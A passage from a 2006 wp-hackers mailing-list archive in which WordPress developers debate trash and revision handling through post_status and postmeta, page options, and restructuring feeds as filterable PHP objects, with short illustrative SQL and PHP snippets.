References: <43EE5465.1090502@tamba2.org.uk>	<20060211214445.GK1070@kimmo.suominen.com>	<007501c62f57$9754b8d0$6e01a8c0@sixfour>	<ebe43d680602120211g681b3a23t@mail.gmail.com>	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>	<ebe43d680602120426u20523b8m@mail.gmail.com>	<001801c62feb$42812de0$6e01a8c0@sixfour>	<43EF5E1D.6030505@midnightcircus.com>	<002101c62ff2$7b6e5fe0$6e01a8c0@sixfour>	<43EF691E.5070206@midnightcircus.com>	<ebe43d680602121214x48bdbc5fp@mail.gmail.com>
	<43EFA6AB.4020608@midnightcircus.com>
Message-ID: <43EFC784.3050906@metalab.unc.edu>

Owen Winkler wrote:

> It seems I have a very different idea about how users should be 
> responsible for the sanctity of their data, and that adding features to 
> account for (however fleeting, accidental, or gross) user incompetence 
> are *convenience features* made out to seem required by UI experts.

Poor software design is the fault of the software designer, not the 
user. Software that does not fit users' natural mental model is poorly 
designed. Software that does not support undo is poorly designed. 
Software that requires the user to read manuals to accomplish obvious 
operations is poorly designed.

It's no surprise that most programmers attempt to evade their 
responsibility and pass the blame to end users. What's surprising is 
that end users let them get away with this. Users have sadly been 
trained to think that their misunderstanding is somehow their fault. 
This too, will change. Eventually users will no more put up with a 
poorly designed piece of software than they would a poorly designed car. 
  Until that day comes, software that is better designed will triumph 
over worse designed software. (Notable exception: software that is 
imposed on users from above without free user choice. Most operating 
system and office software falls into this category.)

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From mark.wordpress at txfx.net  Sun Feb 12 23:42:42 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Sun Feb 12 23:44:22 2006
Subject: [wp-hackers] Data recovery
In-Reply-To: <5aa3aa0602121527n612927cfgfe2781cf607dd81a@mail.gmail.com>
References: <43EE5465.1090502@tamba2.org.uk>
	<ebe43d680602111337l1c8f285aw@mail.gmail.com>
	<20060211214445.GK1070@kimmo.suominen.com>
	<5aa3aa0602121527n612927cfgfe2781cf607dd81a@mail.gmail.com>
Message-ID: <AFA32DC3-485C-4FDB-AF43-9D3F268B5F41@txfx.net>

+1 to using flags instead of another table

+1 to using either postmeta or trashmeta to store the old status (and  
other misc information)

-1 to using a "trash" flag.  That would add another check to the  
WHERE clause of every posts query.  In addition to checking WHERE  
post_status="publish" we would have to check WHERE trash <> '1' or  
some such thing.  The meta approach allows us to store any additional  
information about the post (we could store when it was deleted and by  
whom) without bulking up our normal queries.  It's a bit more work  
when we restore, but that's a rare event, so that's good place to put  
the burden.

--
Mark Jaquith
http://txfx.net/


From dmhouse at gmail.com  Sun Feb 12 23:49:03 2006
From: dmhouse at gmail.com (David House)
Date: Sun Feb 12 23:50:44 2006
Subject: [wp-hackers] Data recovery
In-Reply-To: <AFA32DC3-485C-4FDB-AF43-9D3F268B5F41@txfx.net>
References: <43EE5465.1090502@tamba2.org.uk>
	<ebe43d680602111337l1c8f285aw@mail.gmail.com>
	<20060211214445.GK1070@kimmo.suominen.com>
	<5aa3aa0602121527n612927cfgfe2781cf607dd81a@mail.gmail.com>
	<AFA32DC3-485C-4FDB-AF43-9D3F268B5F41@txfx.net>
Message-ID: <ebe43d680602121549s7bcecf4p@mail.gmail.com>

On 12/02/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
> +1 to using flags instead of another table

What exactly are the arguments against this?

> -1 to using a "trash" flag.  That would add another check to the
> WHERE clause of every posts query.  In addition to checking WHERE
> post_status="publish" we would have to check WHERE trash <> '1' or
> some such thing.  The meta approach allows us to store any additional
> information about the post (we could store when it was deleted and by
> whom) without bulking up our normal queries.  It's a bit more work
> when we restore, but that's a rare event, so that's good place to put
> the burden.

How do you intend to store the trashed items if not in a seperate
table nor in their original table? (the only way to keep them in their
original table would be to set a flag)

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From false.hopes at gmail.com  Sun Feb 12 23:54:46 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Sun Feb 12 23:56:26 2006
Subject: [wp-hackers] Data recovery
In-Reply-To: <ebe43d680602121549s7bcecf4p@mail.gmail.com>
References: <43EE5465.1090502@tamba2.org.uk>
	<ebe43d680602111337l1c8f285aw@mail.gmail.com>
	<20060211214445.GK1070@kimmo.suominen.com>
	<5aa3aa0602121527n612927cfgfe2781cf607dd81a@mail.gmail.com>
	<AFA32DC3-485C-4FDB-AF43-9D3F268B5F41@txfx.net>
	<ebe43d680602121549s7bcecf4p@mail.gmail.com>
Message-ID: <a491f91d0602121554p313b8ca0v33240e4638d371a7@mail.gmail.com>

On 2/12/06, David House <dmhouse@gmail.com> wrote:
> How do you intend to store the trashed items if not in a seperate
> table nor in their original table? (the only way to keep them in their
> original table would be to set a flag)

I believe he meant -1 to storing in a seperate column instead of
*_status, based on the fact that he said there would have to be
changes to SQL queries, whereas if status changed from publish to
trash, we wouldn't have to do any such thing.

--
--Robert Deaton
http://somethingunpredictable.com
From mark.wordpress at txfx.net  Mon Feb 13 00:12:17 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Mon Feb 13 00:13:58 2006
Subject: [wp-hackers] Data recovery
In-Reply-To: <a491f91d0602121554p313b8ca0v33240e4638d371a7@mail.gmail.com>
References: <43EE5465.1090502@tamba2.org.uk>
	<ebe43d680602111337l1c8f285aw@mail.gmail.com>
	<20060211214445.GK1070@kimmo.suominen.com>
	<5aa3aa0602121527n612927cfgfe2781cf607dd81a@mail.gmail.com>
	<AFA32DC3-485C-4FDB-AF43-9D3F268B5F41@txfx.net>
	<ebe43d680602121549s7bcecf4p@mail.gmail.com>
	<a491f91d0602121554p313b8ca0v33240e4638d371a7@mail.gmail.com>
Message-ID: <17E7460D-EC7A-45CD-8D20-314987EB1B41@txfx.net>

On Feb 12, 2006, at 6:54 PM, Robert Deaton wrote:

> I believe he meant -1 to storing in a seperate column instead of
> *_status, based on the fact that he said there would have to be
> changes to SQL queries, whereas if status changed from publish to
> trash, we wouldn't have to do any such thing.

Yes, exactly what I meant.  Sorry for the confusion.

--
Mark Jaquith
http://txfx.net/


From chetan at ckunte.com  Mon Feb 13 03:26:00 2006
From: chetan at ckunte.com (Chetan Kunte)
Date: Mon Feb 13 03:27:42 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <a491f91d0602110852o7975d249y4019c4d4f1115563@mail.gmail.com>
References: <000001c62cb1$8d43c460$6802a8c0@kergan>
	<43E9F1D6.3030505@ryanduff.net>
	<ebe43d680602080610g58468270u@mail.gmail.com>
	<1139428294.1474.11.camel@localhost.localdomain>
	<6901708b0602091148l424bb6e9jc4e00525e2a42f7d@mail.gmail.com>
	<ebe43d680602110732t76a7c42fi@mail.gmail.com>
	<a491f91d0602110852o7975d249y4019c4d4f1115563@mail.gmail.com>
Message-ID: <74b84aa30602121926p5c17805cka8fa55e8f38f685c@mail.gmail.com>

I really like the toggle feature that Textpattern has. If we treat
sections as paged pages in WordPress, then this would be nice.

Particularly like the options like below for page location from within
admin panel:

Homepage
On front page?         ( )no (.)yes
Syndicate              (.)no ( )yes
Include in site search (.)no ( )yes

Blog
On front page?         (.)no ( )yes
Syndicate              ( )no (.)yes
Include in site search ( )no (.)yes

Colophon
On front page?         (.)no ( )yes
Syndicate              (.)no ( )yes
Include in site search ( )no (.)yes

Also, in Textpattern, when you create a section (Page for WordPress),
you don't have to update your htaccess (I still manually append this
file whenever I create a new page).
--
Chetan, ckunte.com
From mark.wordpress at txfx.net  Mon Feb 13 05:24:41 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Mon Feb 13 05:26:24 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <74b84aa30602121926p5c17805cka8fa55e8f38f685c@mail.gmail.com>
References: <000001c62cb1$8d43c460$6802a8c0@kergan>
	<43E9F1D6.3030505@ryanduff.net>
	<ebe43d680602080610g58468270u@mail.gmail.com>
	<1139428294.1474.11.camel@localhost.localdomain>
	<6901708b0602091148l424bb6e9jc4e00525e2a42f7d@mail.gmail.com>
	<ebe43d680602110732t76a7c42fi@mail.gmail.com>
	<a491f91d0602110852o7975d249y4019c4d4f1115563@mail.gmail.com>
	<74b84aa30602121926p5c17805cka8fa55e8f38f685c@mail.gmail.com>
Message-ID: <890D8816-75AA-44D5-AB2D-AC522CD7F894@txfx.net>

On Feb 12, 2006, at 10:26 PM, Chetan Kunte wrote:

> Also, in Textpattern, when you create a section (Page for WordPress),
> you don't have to update your htaccess (I still manually append this
> file whenever I create a new page).

As of WP 2.0, you don't have to update your .htaccess when you add a  
page.  It's all handled by the internal rewriter.
--
Mark Jaquith
http://txfx.net/


From gopal at gopalarathnam.com  Mon Feb 13 09:18:14 2006
From: gopal at gopalarathnam.com (Gopalarathnam Venkatesan)
Date: Mon Feb 13 09:19:54 2006
Subject: [wp-hackers] HTTP Auth/URL Rewriting
In-Reply-To: <43EF819B.5040207@ebroder.net>
References: <43EF819B.5040207@ebroder.net>
Message-ID: <4cba61b90602130118s3afefdabwb7439e716fe62b28@mail.gmail.com>

On 2/13/06, Evan Broder <wp@ebroder.net> wrote:
> Is anybody still looking at this - http://trac.wordpress.org/ticket/2397?
>
> I've been trying to hack around the .htaccess file, but I don't know
> mod_rewrite well enough to do anything about it.
>
> - Evan
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

May be I'll try this tonight :)

--
Gopalarathnam Venkatesan
http://gopalarathnam.com/
From grijalva at gmail.com  Mon Feb 13 09:22:07 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Mon Feb 13 09:23:48 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
Message-ID: <a0159cd30602130122o50958aa9tcf9606dd808a7e7f@mail.gmail.com>

Are there any filter hooks that I can use for the extra fields data?
Specifically, I want to be able to do some string replacements for an RSS
Enclosure (podcast).  Any ideas?

-dave
From wphackers at jamietalbot.com  Mon Feb 13 13:01:28 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Mon Feb 13 13:03:28 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <a0159cd30602130122o50958aa9tcf9606dd808a7e7f@mail.gmail.com>
References: <a0159cd30602130122o50958aa9tcf9606dd808a7e7f@mail.gmail.com>
Message-ID: <43F08328.9050900@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1



Dave Grijalva wrote:
> Are there any filter hooks that I can use for the extra fields data?
> Specifically, I want to be able to do some string replacements for an RSS
> Enclosure (podcast).  Any ideas?
> 

I added a ticket to Trac requesting the same thing for different elements of feeds this morning - at
the moment these hooks are actions which mean you can't alter anything that's already been added.
Turning them into filters would allow you to do replacements.  Plugins that use these hooks would
have to be modified to return the text they are presented with, however.

The ticket's just for the head sections of the feeds, but you could add a note on the need for other
areas of the feeds too.  Feeds were heavily discussed here recently, though I'm not sure that any
consensus was formed at the end of it.  Are we going to be updating the feeds structure and API
significantly in 2.1?  Is it worth the effort to work up a patch that buffers feed text and then
passes it to a filter, or this likely to all change?

http://trac.wordpress.org/ticket/2438

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD8IMorovxfShShFARAsz4AJ9ja6nlJJa5BAw+LV4oARCCUZS8AwCfVFAV
CESmGfRsNkCHEohXXEInDvg=
=od18
-----END PGP SIGNATURE-----
From ringmaster at midnightcircus.com  Mon Feb 13 14:01:04 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Mon Feb 13 14:02:11 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <43F08328.9050900@jamietalbot.com>
References: <a0159cd30602130122o50958aa9tcf9606dd808a7e7f@mail.gmail.com>
	<43F08328.9050900@jamietalbot.com>
Message-ID: <43F09120.1000907@midnightcircus.com>

Jamie Talbot wrote:
> The ticket's just for the head sections of the feeds, but you could add a note on the need for other
> areas of the feeds too.  Feeds were heavily discussed here recently, though I'm not sure that any
> consensus was formed at the end of it.  Are we going to be updating the feeds structure and API
> significantly in 2.1?  Is it worth the effort to work up a patch that buffers feed text and then
> passes it to a filter, or this likely to all change?

Here's an off-the-wall suggestion...

What if we built feeds as PHP objects, fed them through a filter, then 
converted the object to XML?

There are some extant implementations of Object<->XML in PHP, so it 
might not be too difficult a conversion.  Manipulating the feed XML via 
DOM in a plugin would be swell.

Before I continue blathering about this, how much does this idea suck?

Owen

From wphackers at jamietalbot.com  Mon Feb 13 14:13:40 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Mon Feb 13 14:15:34 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <43F09120.1000907@midnightcircus.com>
References: <a0159cd30602130122o50958aa9tcf9606dd808a7e7f@mail.gmail.com>	<43F08328.9050900@jamietalbot.com>
	<43F09120.1000907@midnightcircus.com>
Message-ID: <43F09414.5010707@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Owen Winkler wrote:
> Here's an off-the-wall suggestion...
> 
> What if we built feeds as PHP objects, fed them through a filter, then
> converted the object to XML?
> 
> There are some extant implementations of Object<->XML in PHP, so it
> might not be too difficult a conversion.  Manipulating the feed XML via
> DOM in a plugin would be swell.
> 
> Before I continue blathering about this, how much does this idea suck?
> 
> Owen

I definitely like the feeds as objects idea.  A base feed class WPFeed with vars to hold all
available information that could be subtyped for different feed flavours, WPAtom, WPRSS each with
their own methods of using that data would be nice.  It would also be nicely future proof when the
next latest and greatest feed format comes along as it would only require a new class with its own
'print' method.

If converting to XML was a trivial task already implemented, that might be cool too.

Is there mileage in this?

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD8JQTrovxfShShFARApeQAJ48ZV2CKnAOMP18Y2o6EP8t/u+dCwCfdqcx
OBWgiV1obb0Tg5IeiX9XgWM=
=dNYv
-----END PGP SIGNATURE-----
From davebytes at comcast.net  Mon Feb 13 15:15:18 2006
From: davebytes at comcast.net (David Chait)
Date: Mon Feb 13 15:17:03 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
References: <a0159cd30602130122o50958aa9tcf9606dd808a7e7f@mail.gmail.com><43F08328.9050900@jamietalbot.com>
	<43F09120.1000907@midnightcircus.com>
Message-ID: <09d201c630b0$4ff261e0$6e01a8c0@sixfour>

http://comox.textdrive.com/pipermail/wp-hackers/2006-January/004111.html
http://comox.textdrive.com/pipermail/wp-hackers/2006-January/004101.html

There have been multiple calls here (in two threads) to switch over to 
something like FeedCreator for maintaining the various feed formats.  Alex 
presented FeedCreator originally, I gave it a +1, and in a separate thread 
Mark and Kimmo basically both gave it approval as well (Kimmo uses it 
already...).  FC looks like it uses the create-in-php, 
output-in-whatever-format approach.

That should make for easier coding, less maintenance work per-feed, faster 
enhancements.  We might have to 'adopt' the FC project to get it where we 
want, but no need to start from scratch.

-d

----- Original Message ----- 
From: "Owen Winkler" <ringmaster@midnightcircus.com>
To: <wp-hackers@lists.automattic.com>
Sent: Monday, February 13, 2006 9:01 AM
Subject: Re: [wp-hackers] Filter Hooks for Enclosures


| Jamie Talbot wrote:
| > The ticket's just for the head sections of the feeds, but you could add 
a note on the need for other
| > areas of the feeds too.  Feeds were heavily discussed here recently, 
though I'm not sure that any
| > consensus was formed at the end of it.  Are we going to be updating the 
feeds structure and API
| > significantly in 2.1?  Is it worth the effort to work up a patch that 
buffers feed text and then
| > passes it to a filter, or this likely to all change?
|
| Here's an off-the-wall suggestion...
|
| What if we built feeds as PHP objects, fed them through a filter, then
| converted the object to XML?
|
| There are some extant implementations of Object<->XML in PHP, so it
| might not be too difficult a conversion.  Manipulating the feed XML via
| DOM in a plugin would be swell.
|
| Before I continue blathering about this, how much does this idea suck?
|
| Owen 

From dstewart at atl.lmco.com  Mon Feb 13 15:16:43 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Mon Feb 13 15:18:34 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <43EEC3BA.1050507@boren.nu>
References: <43EE5465.1090502@tamba2.org.uk>
	<ebe43d680602111337l1c8f285aw@mail.gmail.com>
	<20060211214445.GK1070@kimmo.suominen.com>
	<007501c62f57$9754b8d0$6e01a8c0@sixfour>
	<C0A15693-5CAE-4EE7-8C3C-80122CDEAD52@txfx.net>
	<43EEC3BA.1050507@boren.nu>
Message-ID: <43F0A2DB.4070807@atl.lmco.com>

Ryan Boren wrote:
> All post_status != comparisons should be gone soon.  I still need to get 
> rid of the != 'draft' comparison in execute-pings.php.  That one could 
> be = 'publish' instead.

*ahem* == 'publish', if you please.

*grin*
-- 
----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
From wp at ebroder.net  Mon Feb 13 15:24:14 2006
From: wp at ebroder.net (Evan Broder)
Date: Mon Feb 13 15:27:01 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <43F09120.1000907@midnightcircus.com>
References: <a0159cd30602130122o50958aa9tcf9606dd808a7e7f@mail.gmail.com>	<43F08328.9050900@jamietalbot.com>
	<43F09120.1000907@midnightcircus.com>
Message-ID: <43F0A49E.4090508@ebroder.net>



Owen Winkler wrote:
> Here's an off-the-wall suggestion...
>
> What if we built feeds as PHP objects, fed them through a filter, then 
> converted the object to XML?
>
> There are some extant implementations of Object<->XML in PHP, so it 
> might not be too difficult a conversion.  Manipulating the feed XML 
> via DOM in a plugin would be swell.
>
> Before I continue blathering about this, how much does this idea suck?
>
> Owen
+1, Owen. We'd just have to be careful to make sure it would work with 
most PHP installations, i.e., not use the domxml extension in PHP, 
because a) it's not installed by default and b) it's not included in PHP5.

Maybe if we adapted something in PEAR?

Also, Owen, this deals with all of the issues you talked about on your blog.

Good idea, IMHO

- Evan
From denis at semiologic.com  Mon Feb 13 15:29:19 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Mon Feb 13 15:31:06 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <43F09120.1000907@midnightcircus.com>
Message-ID: <000201c630b2$4293c410$6802a8c0@kergan>

> There are some extant implementations of Object<->XML in PHP, so it 
> might not be too difficult a conversion.  Manipulating the 
> feed XML via 
> DOM in a plugin would be swell.
> 
> Before I continue blathering about this, how much does this idea suck?

DOM/XML related stuff is far from being installed properly on most hosts,
and does not work the same in php4 and php5. I'd use a straightforward array
instead.

D.

From dmhouse at gmail.com  Mon Feb 13 16:19:09 2006
From: dmhouse at gmail.com (David House)
Date: Mon Feb 13 16:20:54 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <43F0A2DB.4070807@atl.lmco.com>
References: <43EE5465.1090502@tamba2.org.uk>
	<ebe43d680602111337l1c8f285aw@mail.gmail.com>
	<20060211214445.GK1070@kimmo.suominen.com>
	<007501c62f57$9754b8d0$6e01a8c0@sixfour>
	<C0A15693-5CAE-4EE7-8C3C-80122CDEAD52@txfx.net>
	<43EEC3BA.1050507@boren.nu> <43F0A2DB.4070807@atl.lmco.com>
Message-ID: <ebe43d680602130819n474cfccfu@mail.gmail.com>

On 13/02/06, Doug Stewart <dstewart@atl.lmco.com> wrote:
> *ahem* == 'publish', if you please.

Not in MySQL, actually.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From dmhouse at gmail.com  Mon Feb 13 16:21:14 2006
From: dmhouse at gmail.com (David House)
Date: Mon Feb 13 16:22:56 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <09d201c630b0$4ff261e0$6e01a8c0@sixfour>
References: <a0159cd30602130122o50958aa9tcf9606dd808a7e7f@mail.gmail.com>
	<43F08328.9050900@jamietalbot.com>
	<43F09120.1000907@midnightcircus.com>
	<09d201c630b0$4ff261e0$6e01a8c0@sixfour>
Message-ID: <ebe43d680602130821u522b8d3cp@mail.gmail.com>

On 13/02/06, David Chait <davebytes@comcast.net> wrote:
> There have been multiple calls here (in two threads) to switch over to
> something like FeedCreator for maintaining the various feed formats.  Alex
> presented FeedCreator originally, I gave it a +1, and in a separate thread
> Mark and Kimmo basically both gave it approval as well (Kimmo uses it
> already...).  FC looks like it uses the create-in-php,
> output-in-whatever-format approach.

It's also a _lot_ of code (several hundred lines worth) that would
replace the mostly functional ~70 lines of code for feeds as present.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From dougal at gunters.org  Fri Feb 10 19:58:34 2006
From: dougal at gunters.org (Dougal Campbell)
Date: Mon Feb 13 16:24:38 2006
Subject: [wp-hackers] Documentation on the caching functions?
In-Reply-To: <43EC8C04.9020401@midnightcircus.com>
References: <20060209231114.32274638F@comox.textdrive.com>	<43EC76B4.4000500@viper007bond.com>
	<43EC8C04.9020401@midnightcircus.com>
Message-ID: <43ECF06A.40902@gunters.org>

Owen Winkler wrote:
> Viper007Bond wrote:
>> I'm using the digest method as I don't want 50 e-mails a day in my inbox
>> and as a result, the attached didn't seem to come through. Mind
>> sending it directly to me? Thanks!  :)
> 
> The attachment didn't make it to the regular mailing list, either.

Doh. When my previous message came back to me through the list, it 
showed an attachment, so I thought all was fine. But when I actually 
open it, it's just a copy of the list .sig.

How about if I just make a blog post about it?

-- 
Dougal Campbell <dougal@gunters.org>
http://dougal.gunters.org/

From jeff at jrm.cc  Mon Feb 13 16:46:25 2006
From: jeff at jrm.cc (Jeff Minard)
Date: Mon Feb 13 16:48:15 2006
Subject: [wp-hackers] post_status == previous
In-Reply-To: <003301c62ff5$ac4b5930$6e01a8c0@sixfour>
References: <43EE5465.1090502@tamba2.org.uk><ebe43d680602111337l1c8f285aw@mail.gmail.com><20060211214445.GK1070@kimmo.suominen.com><007501c62f57$9754b8d0$6e01a8c0@sixfour><ebe43d680602120211g681b3a23t@mail.gmail.com><F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net><ebe43d680602120426u20523b8m@mail.gmail.com><001801c62feb$42812de0$6e01a8c0@sixfour>	<008001c62ff3$6e2d51a0$6402a8c0@DELL8600>
	<003301c62ff5$ac4b5930$6e01a8c0@sixfour>
Message-ID: <43F0B7E1.40901@jrm.cc>

David Chait wrote:
> Hmmm.  Interesting.  Revision tracking has been discussed before -- is 
> storing delta-diffs (like subversion) overly difficult as part of the save 
> process?  I know it's been a request previously... separate topic/thread?

Ahem, as long as we're at it...

   post_status = "previous"

Sort those old ones by last mod date (if we keep that...) and away you 
go. Making a diff on the fly to show changes would work. Storing the 
difference would work to I suppose, but seems a little odd to me -- I'd 
rather have the actual content in the "previous" version.

Of course, this kind of manipulation would:

1) Not be needed in the core -- how many people need revisioning? 
Honestly? I can see it being useful for a select few people (like us 
power users) who do it once, but for most "blog and go" users it would 
simply add cruft and one more thing to take up attention on an already 
bulging post page.

2) Totally screw up the post id counts.

To be honest, I'm very surprised that throughout these threads we 
haven't heard (or I haven't read) the "post id's on my blog must be one 
after the other" nuts going ape wild about what a post_status 
free-for-all flag is going to do to their preciously cultivated table.

Jeff
From dstewart at atl.lmco.com  Mon Feb 13 16:47:09 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Mon Feb 13 16:48:53 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <ebe43d680602130819n474cfccfu@mail.gmail.com>
References: <43EE5465.1090502@tamba2.org.uk>
	<ebe43d680602111337l1c8f285aw@mail.gmail.com>
	<20060211214445.GK1070@kimmo.suominen.com>
	<007501c62f57$9754b8d0$6e01a8c0@sixfour>
	<C0A15693-5CAE-4EE7-8C3C-80122CDEAD52@txfx.net>
	<43EEC3BA.1050507@boren.nu> <43F0A2DB.4070807@atl.lmco.com>
	<ebe43d680602130819n474cfccfu@mail.gmail.com>
Message-ID: <43F0B80D.1000600@atl.lmco.com>

David House wrote:
> On 13/02/06, Doug Stewart <dstewart@atl.lmco.com> wrote:
> 
>>*ahem* == 'publish', if you please.
> 
> 
> Not in MySQL, actually.
> 

Shazbot!  You are, of course, correct.  Here I am, sitting in a php 
frame of mind, completely ignoring the fact that we're talking about 
queries...

Bah.  Snow driving's got me in a funk - unable to concentrate, even 
/after/ my requisite cup(s) o' Joe.  Freakin' Philly traffic.

-- 
----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
From ringmaster at midnightcircus.com  Mon Feb 13 16:58:32 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Mon Feb 13 16:58:45 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <000201c630b2$4293c410$6802a8c0@kergan>
References: <000201c630b2$4293c410$6802a8c0@kergan>
Message-ID: <43F0BAB8.6040904@midnightcircus.com>

Denis de Bernardy wrote:
>> There are some extant implementations of Object<->XML in PHP, so it 
>> might not be too difficult a conversion.  Manipulating the 
>> feed XML via 
>> DOM in a plugin would be swell.
>>
>> Before I continue blathering about this, how much does this idea suck?
> 
> DOM/XML related stuff is far from being installed properly on most hosts,
> and does not work the same in php4 and php5. I'd use a straightforward array
> instead.

That's really more what I was suggesting.

There must be some class that would let us do something like this:

ob_start();
// Existing feed stuff
$xml = ob_get_clean();
$feed = new WPXmlDoc($xml);
$feed = apply_filters('feed_xml', $feed);
$feed->output();

...

add_filter('feed_xml', 'my_feed_xml');
function my_feed_xml($feed)
{
	$feed->data['rss'][0]['customtag'][0] = 'test';
	return $feed;
}

Or something.

Owen

From jeff at jrm.cc  Mon Feb 13 16:59:07 2006
From: jeff at jrm.cc (Jeff Minard)
Date: Mon Feb 13 17:00:53 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <43F0BAB8.6040904@midnightcircus.com>
References: <000201c630b2$4293c410$6802a8c0@kergan>
	<43F0BAB8.6040904@midnightcircus.com>
Message-ID: <43F0BADB.4010809@jrm.cc>

Owen Winkler wrote:
> $xml = ob_get_clean();
> $feed = new WPXmlDoc($xml);

There's a nightmare of a function ;)
From ringmaster at midnightcircus.com  Mon Feb 13 17:21:17 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Mon Feb 13 17:21:33 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <43F0BADB.4010809@jrm.cc>
References: <000201c630b2$4293c410$6802a8c0@kergan>	<43F0BAB8.6040904@midnightcircus.com>
	<43F0BADB.4010809@jrm.cc>
Message-ID: <43F0C00D.3090801@midnightcircus.com>

Jeff Minard wrote:
> Owen Winkler wrote:
>> $xml = ob_get_clean();
>> $feed = new WPXmlDoc($xml);
> 
> There's a nightmare of a function ;)

I was hoping nobody would notice that.  :)

Actually, that's where the libraries I was suggesting come into play. 
There are a couple that will parse XML down into an array or a set of 
manageable PHP objects.  These can then be modified in code (rather than 
manipulating strings and inserting doaction()s between every code line) 
and output with a single $feed->output();

That's the advantage.

Otherwise, how can we satisfy every need to modify these feeds, since 
they're not in editable space (wp-content)?

Owen

From false.hopes at gmail.com  Mon Feb 13 17:23:42 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Mon Feb 13 17:25:23 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <43F0A49E.4090508@ebroder.net>
References: <a0159cd30602130122o50958aa9tcf9606dd808a7e7f@mail.gmail.com>
	<43F08328.9050900@jamietalbot.com>
	<43F09120.1000907@midnightcircus.com> <43F0A49E.4090508@ebroder.net>
Message-ID: <a491f91d0602130923o778b19b8s6d1647d2a73ce132@mail.gmail.com>

On 2/13/06, Evan Broder <wp@ebroder.net> wrote:
> Maybe if we adapted something in PEAR?

I think we should all pretend that you did not just say that.

--
--Robert Deaton
http://somethingunpredictable.com
From false.hopes at gmail.com  Mon Feb 13 17:26:19 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Mon Feb 13 17:27:59 2006
Subject: [wp-hackers] post_status == previous
In-Reply-To: <43F0B7E1.40901@jrm.cc>
References: <43EE5465.1090502@tamba2.org.uk>
	<20060211214445.GK1070@kimmo.suominen.com>
	<007501c62f57$9754b8d0$6e01a8c0@sixfour>
	<ebe43d680602120211g681b3a23t@mail.gmail.com>
	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>
	<ebe43d680602120426u20523b8m@mail.gmail.com>
	<001801c62feb$42812de0$6e01a8c0@sixfour>
	<008001c62ff3$6e2d51a0$6402a8c0@DELL8600>
	<003301c62ff5$ac4b5930$6e01a8c0@sixfour> <43F0B7E1.40901@jrm.cc>
Message-ID: <a491f91d0602130926i3ab14589y5a49a48fb4ee76bb@mail.gmail.com>

On 2/13/06, Jeff Minard <jeff@jrm.cc> wrote:
<snip>
> Of course, this kind of manipulation would:
<snip>
> 2) Totally screw up the post id counts.

This is completely out of the question, as in order to do this, you
have to insert a new post for each revision, and change the old
revision to previous. This means that you just broke permalinks, and
in order to keep permalinks working, you need an extra column in the
field and need to do selects to traverse up to the latest revision of
the post.

--
--Robert Deaton
http://somethingunpredictable.com
From gopal at gopalarathnam.com  Mon Feb 13 17:28:19 2006
From: gopal at gopalarathnam.com (Gopalarathnam Venkatesan)
Date: Mon Feb 13 17:30:04 2006
Subject: [wp-hackers] HTTP Auth/URL Rewriting
In-Reply-To: <4cba61b90602130118s3afefdabwb7439e716fe62b28@mail.gmail.com>
References: <43EF819B.5040207@ebroder.net>
	<4cba61b90602130118s3afefdabwb7439e716fe62b28@mail.gmail.com>
